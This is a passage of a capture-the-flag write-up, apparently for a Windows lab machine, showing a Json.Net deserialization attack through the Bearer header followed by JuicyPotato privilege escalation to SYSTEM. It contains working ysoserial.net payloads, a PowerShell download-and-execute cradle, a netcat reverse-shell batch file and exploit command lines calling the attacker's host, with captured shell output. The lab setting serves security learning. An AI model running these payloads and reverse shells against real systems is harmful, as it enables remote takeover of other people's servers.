Date<span style="color:#ff79c6">:</span> Sun, 16 Feb 2020 15:44:05 GMT
Connection<span style="color:#ff79c6">:</span> close
Content-Length<span style="color:#ff79c6">:</span> 132

{<span style="color:#ff79c6">&#34;Message&#34;</span>:<span style="color:#f1fa8c">&#34;An error has occurred.&#34;</span>,<span style="color:#ff79c6">&#34;ExceptionMessage&#34;</span>:<span style="color:#f1fa8c">&#34;Invalid format base64&#34;</span>,<span style="color:#ff79c6">&#34;ExceptionType&#34;</span>:<span style="color:#f1fa8c">&#34;System.Exception&#34;</span>,<span style="color:#ff79c6">&#34;StackTrace&#34;</span>:<span style="color:#ff79c6">null</span>}
</code></pre></td></tr></table>
</div>
</div><p>Changing the Bearer with base64; Server will ask for json format</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Bearer: bd049f221af82804c5a2826809337c9b
<span style="color:#ff79c6">{</span><span style="color:#f1fa8c">&#34;Message&#34;</span>:<span style="color:#f1fa8c">&#34;An error has occurred.&#34;</span>,<span style="color:#f1fa8c">&#34;ExceptionMessage&#34;</span>:<span style="color:#f1fa8c">&#34;Cannot deserialize Json.Net Object&#34;</span>,<span style="color:#f1fa8c">&#34;ExceptionType&#34;</span>:<span style="color:#f1fa8c">&#34;System.Exception&#34;</span>,<span style="color:#f1fa8c">&#34;StackTrace&#34;</span>:null<span style="color:#ff79c6">}</span>
</code></pre></td></tr></table>
</div>
</div><p>Site running ASP, we may be able to exploit Json.Net Deserialization Object.
We come up with this resource <a href="https://github.com/pwntester/ysoserial.net.git">Deserialization payload generator for a variety of .NET formatters </a></p>
<h1 id="weaponization">Weaponization</h1>
<p>We create a payload that ping our machine and we start <code>tcpdump -i utun4 icmp</code></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">COMMANDO VM
PS C:<span style="color:#f1fa8c">\.</span>..<span style="color:#f1fa8c">\y</span>soserial<span style="color:#f1fa8c">\b</span>in<span style="color:#f1fa8c">\R</span>elease &gt; .<span style="color:#f1fa8c">\y</span>soserial.exe -g ObjectDataProvider -f Json.Net -c <span style="color:#f1fa8c">&#34;ping -n 1 10.10.14.79&#34;</span> -o base64
ew0KICAgICckdHlwZSc6J1N5c3RlbS5XaW5kb3dzLkRhdGEuT2JqZWN0RGF0YVByb3ZpZGVyLCBQcmVzZW50YXRpb25GcmFtZXdvcmssIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1JywgDQogICAgJ01ldGhvZE5hbWUnOidTdGFydCcsDQogICAgJ01ldGhvZFBhcmFtZXRlcnMnOnsNCiAgICAgICAgJyR0eXBlJzonU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdCwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5JywNCiAgICAgICAgJyR2YWx1ZXMnOlsnY21kJywgJy9jIHBpbmcgLW4gMSAxMC4xMC4xNC43OSddDQogICAgfSwNCiAgICAnT2JqZWN0SW5zdGFuY2UnOnsnJHR5cGUnOidTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcywgU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OSd9DQp9

~/Downloads » sudo tcpdump -i utun4 icmp
Password:
tcpdump: verbose output suppressed, use -v or -vv <span style="color:#ff79c6">for</span> full protocol decode
listening on utun4, link-type NULL <span style="color:#ff79c6">(</span>BSD loopback<span style="color:#ff79c6">)</span>, capture size <span style="color:#bd93f9">262144</span> bytes
12:25:52.573821 IP 10.10.10.158 &gt; 10.10.14.79: ICMP <span style="color:#8be9fd;font-style:italic">echo</span> request, id 1, seq 27, length <span style="color:#bd93f9">40</span>
12:25:52.573860 IP 10.10.14.79 &gt; 10.10.10.158: ICMP <span style="color:#8be9fd;font-style:italic">echo</span> reply, id 1, seq 27, length <span style="color:#bd93f9">40</span>
^C
<span style="color:#bd93f9">2</span> packets captured
</code></pre></td></tr></table>
</div>
</div><p>Alternatively, if you don&rsquo;t have visual studio or microsoft windows host to compile; instead of spinning-up a windows VM, we can copy the example on the git hub README.md and replace <code>/ccalc</code> with a powershell script loading a <a href="https://github.com/samratashok/nishang.git">Nishang Powershell Script</a></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">9
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#ff79c6">{</span>
    <span style="color:#f1fa8c">&#34;</span><span style="color:#8be9fd;font-style:italic">$type</span><span style="color:#f1fa8c">&#34;</span>:<span style="color:#f1fa8c">&#34;System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&#34;</span>,
    <span style="color:#f1fa8c">&#34;MethodName&#34;</span>:<span style="color:#f1fa8c">&#34;Start&#34;</span>,
    <span style="color:#f1fa8c">&#34;MethodParameters&#34;</span>:<span style="color:#ff79c6">{</span>
         <span style="color:#f1fa8c">&#34;</span><span style="color:#8be9fd;font-style:italic">$type</span><span style="color:#f1fa8c">&#34;</span>:<span style="color:#f1fa8c">&#34;System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&#34;</span>,
        <span style="color:#f1fa8c">&#34;</span><span style="color:#8be9fd;font-style:italic">$values</span><span style="color:#f1fa8c">&#34;</span>:<span style="color:#ff79c6">[</span><span style="color:#f1fa8c">&#34;cmd&#34;</span>,<span style="color:#f1fa8c">&#34;/cpowershell  -w hidden -noni -nop -c \&#34;IEX(New-Object Net.WebClient).downloadString(&#39;http://10.10.15.176:8080/Invoke-PowerShellTcp.ps1&#39;);Invoke-PowerShellTcp -Reverse -IPAddress 10.10.15.176 -Port 8000\&#34;&#34;</span><span style="color:#ff79c6">]</span>
    <span style="color:#ff79c6">}</span>,
    <span style="color:#f1fa8c">&#34;ObjectInstance&#34;</span>:<span style="color:#ff79c6">{</span><span style="color:#f1fa8c">&#34;</span><span style="color:#8be9fd;font-style:italic">$type</span><span style="color:#f1fa8c">&#34;</span>:<span style="color:#f1fa8c">&#34;System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&#34;</span><span style="color:#ff79c6">}</span>
<span style="color:#ff79c6">}</span>
</code></pre></td></tr></table>
</div>
</div><p>We have now a base64 payload for the Bearer:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ctf@6274ae97a895:~/json/ysoserial.net$ cat payload.json | jq -c <span style="color:#f1fa8c">&#39;&#39;</span> | base64 -w <span style="color:#bd93f9">0</span> ; <span style="color:#8be9fd;font-style:italic">echo</span> -n
<span style="color:#8be9fd;font-style:italic">eyIkdHlwZSI6IlN5c3RlbS5XaW5kb3dzLkRhdGEuT2JqZWN0RGF0YVByb3ZpZGVyLCBQcmVzZW50YXRpb25GcmFtZXdvcmssIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1IiwiTWV0aG9kTmFtZSI6IlN0YXJ0IiwiTWV0aG9kUGFyYW1ldGVycyI6eyIkdHlwZSI6IlN5c3RlbS5Db2xsZWN0aW9ucy5BcnJheUxpc3QsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OSIsIiR2YWx1ZXMiOlsiY21kIiwiL2Nwb3dlcnNoZWxsICAtdyBoaWRkZW4gLW5vbmkgLW5vcCAtYyBcIklFWChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLmRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTAuMTAuMTUuMTc2OjgwODAvSW52b2tlLVBvd2VyU2hlbGxUY3AucHMxJyk7SW52b2tlLVBvd2VyU2hlbGxUY3AgLVJldmVyc2UgLUlQQWRkcmVzcyAxMC4xMC4xNS4xNzYgLVBvcnQgODAwMFwiIl19LCJPYmplY3RJbnN0YW5jZSI6eyIkdHlwZSI6IlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzLCBTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5In19Cg</span><span style="color:#ff79c6">==</span>
</code></pre></td></tr></table>
</div>
</div><p>We forward ports before we send the payload with Burp:<code>ssh username@localhost -L 10.10.15.176:8080:192.168.99.100:8080 -L 10.10.15.176:8000:192.168.99.100:8000</code></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">PS C:<span style="color:#f1fa8c">\w</span>indows<span style="color:#f1fa8c">\s</span>ystem32<span style="color:#f1fa8c">\i</span>netsrv&gt; whoami
json<span style="color:#f1fa8c">\u</span>serpool
PS C:<span style="color:#f1fa8c">\w</span>indows<span style="color:#f1fa8c">\s</span>ystem32<span style="color:#f1fa8c">\i</span>netsrv&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               <span style="color:#8be9fd;font-style:italic">State</span>
<span style="color:#ff79c6">=============================</span> <span style="color:#ff79c6">=========================================</span> <span style="color:#ff79c6">========</span>
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas <span style="color:#ff79c6">for</span> a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeIncreaseWorkingSetPrivilege Increase a process working <span style="color:#8be9fd;font-style:italic">set</span>            Disabled
</code></pre></td></tr></table>
</div>
</div><p>We get the user flag</p>
<h1 id="beyond-root">Beyond root</h1>
<h2 id="juicypotato-root-privilege-escalation">JuicyPotato Root Privilege Escalation</h2>
<p>Having SeImpersonatePrivilege and SeAssignPrimaryToken together enable <a href="https://github.com/ohpe/juicy-potato.git">Juicy-Potato</a> attack for root privilege escalation.
we can compile it from source but it requires a windows VM, so it is easier to download the <a href="https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe">release</a></p>
<p>we need to find the CSLIDs of the machine, using this script: <a href="https://raw.githubusercontent.com/ohpe/juicy-potato/master/CLSID/GetCLSID.ps1">GetCLSID.ps1</a>
There is a better script <a href="https://raw.githubusercontent.com/ohpe/juicy-potato/master/Test/test_clsid.bat">test_clsid.bat</a> which will try all CLSID from, this list <a href="https://raw.githubusercontent.com/ohpe/juicy-potato/master/CLSID/Windows_Server_2012_Datacenter/CLSID.list">CLSID.list</a></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#ff79c6">{</span>e60687f7-01a1-40aa-86ac-db1cbf673334<span style="color:#ff79c6">}</span>

PS C:<span style="color:#f1fa8c">\u</span>sers<span style="color:#f1fa8c">\u</span>serpool<span style="color:#f1fa8c">\M</span>usic&gt; <span style="color:#8be9fd;font-style:italic">$env</span>:PROCESSOR_ARCHITECTURE
AMD64
</code></pre></td></tr></table>
</div>
</div><p>Juicy-Potato is required to be launched from cmd.exe as it is not powershell-friendly,so the below cannot work :(</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#6272a4"># WRONG : we have to use a *.bat file</span>
cmd /c juicypotato.exe -t * -p <span style="color:#f1fa8c">&#34;c:/windows/system32/cmd.exe /C powershell.exe -w hidden -noni -nop -encodedcommand IgBJAEUAWAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA1AC4AMQA3ADYAOgA4ADAAOAAwAC8ASQBuAHYAbwBrAGUALQBQAG8AdwBlAHIAUwBoAGUAbABsAFQAYwBwAC4AcABzADEAJwApADsASQBuAHYAbwBrAGUALQBQAG8AdwBlAHIAUwBoAGUAbABsAFQAYwBwACAALQBSAGUAdgBlAHIAcwBlACAALQBJAFAAQQBkAGQAcgBlAHMAcwAgADEAMAAuADEAMAAuADEANQAuADEANwA2ACAALQBQAG8AcgB0ACAAOAAwADAAMAAiAAoA&#34;</span> -l <span style="color:#bd93f9">1000</span> -c <span style="color:#f1fa8c">&#34;{e60687f7-01a1-40aa-86ac-db1cbf673334}&#34;</span>
</code></pre></td></tr></table>
</div>
</div><p>So we download a <a href="https://github.com/int0x33/nc.exe">netcat binary</a> and we prepare a *.bat reverse shell</p>
<pre tabindex="0"><code>#reverse.bat
\users\userpool\music\nc64.exe -e cmd.exe 10.10.14.70 8000
</code></pre><p>We launch our exploit</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">PS C:<span style="color:#f1fa8c">\u</span>sers<span style="color:#f1fa8c">\u</span>serpool<span style="color:#f1fa8c">\m</span>usic&gt; wget -outfile reverse.bat http://10.10.14.70:8080/reverse.bat
PS C:<span style="color:#f1fa8c">\u</span>sers<span style="color:#f1fa8c">\u</span>serpool<span style="color:#f1fa8c">\m</span>usic&gt; wget -outfile juicypotato.exe http://10.10.14.70:8080/JuicyPotato.exe
PS C:<span style="color:#f1fa8c">\u</span>sers<span style="color:#f1fa8c">\u</span>serpool<span style="color:#f1fa8c">\m</span>usic&gt; wget -outfile nc64.exe http://10.10.14.70:8080/nc64.exe
PS C:<span style="color:#f1fa8c">\u</span>sers<span style="color:#f1fa8c">\u</span>serpool<span style="color:#f1fa8c">\m</span>usic&gt; cmd /c juicypotato.exe -t * -p <span style="color:#f1fa8c">\u</span>sers<span style="color:#f1fa8c">\u</span>serpool<span style="color:#f1fa8c">\m</span>usic<span style="color:#f1fa8c">\r</span>everse.bat -l <span style="color:#bd93f9">1000</span> -c <span style="color:#f1fa8c">&#34;{E60687f7-01a1-40aa-86ac-db1cbf673334}&#34;</span>
Testing <span style="color:#ff79c6">{</span>E60687f7-01a1-40aa-86ac-db1cbf673334<span style="color:#ff79c6">}</span> <span style="color:#bd93f9">1000</span>
....
<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> authresult <span style="color:#bd93f9">0</span>
<span style="color:#ff79c6">{</span>E60687f7-01a1-40aa-86ac-db1cbf673334<span style="color:#ff79c6">}</span>;NT AUTHORITY<span style="color:#f1fa8c">\S</span>YSTEM

<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> CreateProcessWithTokenW OK
PS C:<span style="color:#f1fa8c">\u</span>sers<span style="color:#f1fa8c">\u</span>serpool<span style="color:#f1fa8c">\m</span>usic&gt;
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
ctf@6274ae97a895:~/json$ rlwrap nc -lnvp <span style="color:#bd93f9">8000</span>
listening on <span style="color:#ff79c6">[</span>any<span style="color:#ff79c6">]</span> <span style="color:#bd93f9">8000</span> ...
connect to <span style="color:#ff79c6">[</span>172.17.0.2<span style="color:#ff79c6">]</span> from <span style="color:#ff79c6">(</span>UNKNOWN<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">[</span>192.168.99.1<span style="color:#ff79c6">]</span> <span style="color:#bd93f9">53578</span>
Microsoft Windows <span style="color:#ff79c6">[</span>Version 6.3.9600<span style="color:#ff79c6">]</span>
<span style="color:#ff79c6">(</span>c<span style="color:#ff79c6">)</span> <span style="color:#bd93f9">2013</span> Microsoft Corporation. All rights reserved.

C:<span style="color:#f1fa8c">\W</span>indows<span style="color:#f1fa8c">\s</span>ystem32&gt;cd ../../Users/superadmin/Desktop
<span style="color:#8be9fd;font-style:italic">cd</span> ../../Users/superadmin/Desktop

C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\s</span>uperadmin<span style="color:#f1fa8c">\D</span>esktop&gt;type root.txt
<span style="color:#8be9fd;font-style:italic">type</span> root.txt
3cc*************************d441
C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\s</span>uperadmin<span style="color:#f1fa8c">\D</span>esktop&gt;
</code></pre></td></tr></table>
</div>
</div><p>We now have the flag :)</p>
<h3 id="juicypotato-working-syntax">JuicyPotato working Syntax</h3>
<p>WORKING COMMAND LINE</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cmd /c juicypotato.exe -t * -p <span style="color:#f1fa8c">\u</span>sers<span style="color:#f1fa8c">\u</span>serpool<span style="color:#f1fa8c">\m</span>usic<span style="color:#f1fa8c">\r</span>everse.bat -l <span style="color:#bd93f9">1000</span> -c <span style="color:#f1fa8c">&#34;{E60687f7-01a1-40aa-86ac-db1cbf673334}&#34;</span>
cmd /c juicypotato.exe -t * -p c:<span style="color:#f1fa8c">\u</span>sers<span style="color:#f1fa8c">\u</span>serpool<span style="color:#f1fa8c">\m</span>usic<span style="color:#f1fa8c">\r</span>everse.bat -l <span style="color:#bd93f9">1000</span> -c <span style="color:#f1fa8c">&#34;{E60687f7-01a1-40aa-86ac-db1cbf673334}&#34;</span>
</code></pre></td></tr></table>
</div>
</div><p>working reverse.bat batch file:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
